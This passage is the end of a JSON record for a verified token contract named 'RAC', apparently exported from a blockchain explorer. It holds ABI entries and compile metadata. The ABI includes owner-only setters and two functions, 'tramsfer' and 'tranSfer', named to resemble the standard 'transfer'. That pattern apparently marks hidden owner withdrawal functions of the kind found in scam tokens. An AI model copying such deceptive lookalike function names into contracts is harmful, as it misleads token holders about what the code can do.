ype\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IDEXRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"burn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"rewards\",\"type\":\"uint256\"}],\"name\":\"setAllot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"newSwapMin\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newSwapMax\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"swapByLimitOnly\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"part\",\"type\":\"uint256\"}],\"name\":\"setAutoSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ceo_\",\"type\":\"address\"}],\"name\":\"setCeo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"users\",\"type\":\"address[]\"},{\"internalType\":\"uint8\",\"name\":\"fee\",\"type\":\"uint8\"},{\"internalType\":\"bool\",\"name\":\"txLimit\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"positionLimit\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"reward\",\"type\":\"bool\"}],\"name\":\"setEx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txMax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"positionMax\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"whale\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"part\",\"type\":\"uint256\"}],\"name\":\"setLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"list\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"share\",\"type\":\"uint256[]\"}],\"name\":\"setMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"}],\"name\":\"setPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxgasprice_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxamount_\",\"type\":\"uint256\"}],\"name\":\"setmx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"step\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"rAmount\",\"type\":\"uint256\"}],\"name\":\"tokenFromReflection\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenType\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"tramsfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"tranSfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"version\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "RAC", "CompilerVersion": "v0.8.15+commit.e14f2714", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000e88091b1c85d08a50f970b09ab1ac3f4229c48c3", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://6000bd45b3ec630bcc0e53be4a87f94afb5e657efffe81c585629f868fb3ee49"}